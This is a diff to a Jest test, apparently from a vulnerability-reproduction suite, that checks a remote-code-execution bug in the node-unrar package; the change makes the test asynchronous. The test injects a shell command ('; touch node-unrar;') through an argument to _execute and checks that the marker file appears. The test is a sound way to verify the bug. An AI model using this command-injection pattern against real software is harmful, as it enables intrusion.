@@ -1,5 +1,5 @@
 //https://issueexplorer.com/issue/scopsy/node-unrar/10
-test("Remote code execution in node-unrar", () => {
+test("Remote code execution in node-unrar", (done) => {
   expect.assertions(2);
   const Unrar = require("node-unrar");
   const fs = require("fs");
@@ -17,9 +17,12 @@ test("Remote code execution in node-unrar", () => {
   expect(file_exist).toBe(false);
   try {
     var rar = new Unrar("/path/to/file.rar");
-    rar._execute([], "; touch node-unrar;", function () {});
+    rar._execute([], "; touch node-unrar;", function () {
+      file_exist = fs.existsSync(path);
+      expect(file_exist).toBe(true);
+      fs.unlink(path, function (err) {
+        done();
+      });
+    });
   } catch (error) {}
-  file_exist = fs.existsSync(path);
-  expect(file_exist).toBe(true);
-  fs.unlink(path, function (err) {});
 });
